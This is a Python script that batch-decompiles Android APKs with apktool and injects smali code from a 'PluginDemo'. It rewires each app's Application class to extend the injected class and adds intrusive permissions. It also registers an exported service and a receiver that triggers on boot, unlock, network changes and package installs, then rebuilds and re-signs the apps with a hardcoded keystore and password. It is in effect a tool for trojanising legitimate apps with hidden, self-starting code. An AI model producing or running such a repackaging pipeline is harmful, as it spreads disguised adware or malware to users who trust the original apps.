#!/usr/bin/env python
# -*- coding:utf-8 -*-  
# @Time    : 2017/8/16 14:24
# @Author  : CGX




import os
import re
import shutil
import datetime

path = '/Users/cuangengxuan/Desktop/proguard/AutoInsert'
decompile='java -jar '+path+'/apktool_2.2.3.jar d -f '
build = 'java -jar '+path+'/apktool_2.2.3.jar b -f '
insertApkPath = path+'/InsertApk'
global insertFileName
demo = path+'/PluginDemo'
aName = "Lcom/gkm/ogt/App"
applicationName = "com.gkm.ogt.App"

# 删除文件
def deleteFile(sourceDir, deleteFile):
    for root, dirs, files in os.walk(sourceDir):
        for fileName in files:
            srcFilePath = os.path.join(root, fileName)
            if deleteFile in fileName:
                os.remove(srcFilePath)
                print("删除", srcFilePath)


# 复制文件
def copyFiles(sourceDir,  targetDir):
    for file in os.listdir(sourceDir):
        sourceFile = os.path.join(sourceDir,  file)
        targetFile = os.path.join(targetDir,  file)
        if os.path.isfile(sourceFile):
            if not os.path.exists(targetDir):
                os.makedirs(targetDir)
            if not os.path.exists(targetFile) or (os.path.exists(targetFile) and (os.path.getsize(targetFile) != os.path.getsize(sourceFile))):
                if '.smali' in file:
                    srcRead = open(sourceFile, 'r')
                    desWrite = open(targetFile, 'wb')
                    while True:
                        line = srcRead.readline()
                        if not line:
                            break
                        if 'subid' in line:
                            subid = insertFileName[-(len(insertFileName)-insertFileName.rfind('.')-1):]
                            line = line.replace("subid",subid)
                            print("\033[32;0msubid:"+line)
                            print('\033[0m')
                        desWrite.write(line.encode('utf-8'))

                    srcRead.close()
                    desWrite.close()
                else:
                    open(targetFile, "wb").write(open(sourceFile, "rb").read())
        if os.path.isdir(sourceFile):
            First_Directory = False
            copyFiles(sourceFile, targetFile)


# 重命名文件
def reNameFiles(sourceDir, targetDir):
    for file in os.listdir(sourceDir):
        sourceFile = os.path.join(sourceDir, file)
        file = file.replace('_', '.').replace(' ', '.')
        fileName = file.replace('.apk', '');
        sub = 'U' + fileName[-(len(fileName) - fileName.rfind('.') - 1):]
        file = fileName + '.' + sub + ".apk"
        targetFile = os.path.join(targetDir, file)
        if os.path.isfile(sourceFile):
            if not os.path.exists(targetDir):
                os.makedirs(targetDir)
            if not os.path.exists(targetFile) or (
                os.path.exists(targetFile) and (os.path.getsize(targetFile) != os.path.getsize(sourceFile))):
                    open(targetFile, "wb").write(open(sourceFile, "rb").read())
        if os.path.isdir(sourceFile):
            First_Directory = False
            copyFiles(sourceFile, targetFile)


# 处理Application的类，让其继承Application的类继承com.sub.core.App
def handleApplication(classNamePath, className):
    sourceFile = classNamePath + className + ".smali"
    targetFile = classNamePath + className + ".txt"
    print("\033[32;0mapplication smali:" + sourceFile)
    srcRead = open(sourceFile, 'r')
    count = 0
    isNeed = False
    while True:
        line = srcRead.readline()
        if 1 == count:
            # 如果该类直接继承Application就直接处理，如果不是继承Application需要递归找到继承Application的类
            if 'super' in line:
                if 'android/app/Application' in line:
                    print("\033[32;0msourceFile:"+sourceFile)
                    isNeed = True
                else:
                    result = re.search('L.*;', line)
                    if result:
                        str = result.group().replace(";",'')[1:]
                        print("\033[32;0mnext application:"+str)
                        # 递归找到继承Application的类
                        handleApplication(classNamePath, str)
        if count == 1:
            break

        count = count + 1

    srcRead.close()

    # 处理继承Application的类，让其继承com.sub.core.App
    if isNeed:
        srcRead = open(sourceFile, 'r')
        desWrite = open(targetFile, 'wb')
        while True:
            line = srcRead.readline()
            if not line:
                break
            if 'super' in line:
                replace_reg = re.compile('Landroid/app/Application;')
                line = replace_reg.sub(aName+";", line)
            if 'invoke-direct {p0}, Landroid/app/Application;-><init>()V' in line:
                line = line.replace('Landroid/app/Application', aName)
            desWrite.write(line.encode('utf-8'))

        srcRead.close()
        desWrite.close()
        os.remove(os.path.join(sourceFile))
        os.rename(targetFile, sourceFile)

# 处理清单文件，添加权限和组件，修改Application入口类
def handleManifest():
    # 清单文件添加权限和组件
    permission = ''' 
       <uses-permission android:name="android.permission.INTERNET"/>
       <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
       <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
       <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
       <uses-permission android:name="android.permission.GET_TASKS"/>
       <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
       <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
       <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
       <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
       <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>\n'''

    assembly = '''
        <service android:exported="true" android:name="com.gkm.ogt.MS" android:process=":subc" />
        <receiver android:name="com.gkm.ogt.RE">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>\n'''

    sourceFile = path + '/' + insertFileName + '/AndroidManifest.xml'
    targetFile = path + '/' + insertFileName + '/AndroidManifest.txt'
    srcRead = open(sourceFile, 'r')
    desWrite = open(targetFile, 'wb')
    writePer = True
    writeA = True
    while True:
        line = srcRead.readline()
        if not line:
            break
        if writePer:
            if '<uses-permission' in line:
                writePer = False
                desWrite.write(permission.encode('utf-8'))
        if writeA:
            if '<activity' in line or '<service' in line:
                writeA = False
                desWrite.write(assembly.encode('utf-8'))

        if '<application' in line:
            if 'android:name=' in line:  # 如果有入口获取其入口类的全路径
                result = re.search('android:name="[^"]*"', line)  # 匹配android:name="com.a.app"
                if result:
                    # android:name=".*?"
                    # str = result.group().replace('"', '').split(' ')[0].split('=')
                    str = result.group().replace('"','').split('=')
                    className = str[1]

                    # 该入口类的smali代码所在的路径
                    classNamePath = path + '/' + insertFileName + "/smali/"
                    print("\033[32;0m有入口类Application Name:"+className)

                    # 处理入口类让其继承com.sub.core.App
                    handleApplication(classNamePath, className.replace(".", "/"))

            else: # 如果没有入口类直接添加ndroid:name="com.sub.core.App作为入口类
                str = line[0:(line.find('>'))]
                line = str+' android:name="'+applicationName+'">'
                print("\033[32;0m没有入口类"+line)

        desWrite.write(line.encode('utf-8'))

    srcRead.close()
    desWrite.close()
    os.remove(os.path.join(sourceFile))
    os.rename(targetFile, sourceFile)


def func():

    count = 0;
    successed = 0;
    failed = 0;
    failedList = []
    sTime = datetime.datetime.now()
    # 保存文件名  包名   subid
    desWrite = open("/Users/cuangengxuan/Desktop/PackageInfo.txt", 'wb')
    for root, dirs, files in os.walk(insertApkPath):
        for fileName in files:
            srcFilePath = os.path.join(root, fileName)
            if '.apk' in srcFilePath:
                count = count + 1
                print('\033[31;0m***********************************************************************')
                print('\033[31;0m正在处理第%d个包:%s' % (count, fileName))
                print('\033[0m')
                starttime = datetime.datetime.now()

                # 反编译命令
                cmd = decompile+srcFilePath
                os.system('cd '+path +' && '+ cmd) # ' && '连续执行两条指令

                # 获取正在处理的文件名
                global insertFileName
                insertFileName = fileName.replace('.apk','')
                insertFilePath = path + "/" + insertFileName

                # 复制assert
                copyFiles(demo+'/assets', insertFilePath + '/assets')
                # 复制smali代码
                copyFiles(demo + '/smali', insertFilePath + '/smali')

                try:
                    # 处理清单文件，copy权限和组件，
                    # 如果没有Application入口，直接在清单文件中添加android:name="com.sub.core.App"
                    # 如果入口获取入口的全路径，修改其入口文件的smali代码让其继承咱的com.sub.core.App
                    handleManifest()
                    print('\033[0m')

                    # 删除DS_Store文件
                    deleteFile(insertFilePath, ".DS_Store")

                    # 回编译
                    b = build + insertFilePath
                    os.system(b)

                    # 重新签名
                    apkPath = path+"/" + fileName.replace(".apk", "")+"/dist/"+fileName
                    jarsigner = 'jarsigner -verbose -keystore /Users/cuangengxuan/Desktop/apk/uc.keystore -storepass emob123 -keypass emob123 -sigfile CERT -digestalg SHA1 -sigalg MD5withRSA -signedjar '+path+'/Success/'+fileName+' '+apkPath+' uc'
                    os.system('cd '+path +' && ' + jarsigner)

                    if os.path.exists(insertFilePath):
                        shutil.rmtree(insertFilePath)
                    successed = successed + 1

                except Exception as e:
                    failed = failed + 1
                    print('\033[35;0m', Exception, ":", e)
                    print('\033[35;0m'+insertFileName+"该文件处理失败！")
                    failedList.append(insertFileName)
                endtime = datetime.datetime.now()
                print('\033[31;0m该包处理时间：', (endtime - starttime))
                print('\033[0m')


    print('\033[31;0m插包完成！本次成功处理了%d个包, 失败了%d个'%(successed, failed))
    if failed > 0:
        print("\033[31;0m失败的文件：",failedList)
    print('\033[31;0m总用时：', (datetime.datetime.now() - sTime))


if __name__ == '__main__':
    func();
    # reNameFiles(insertApkPath+'_original', insertApkPath)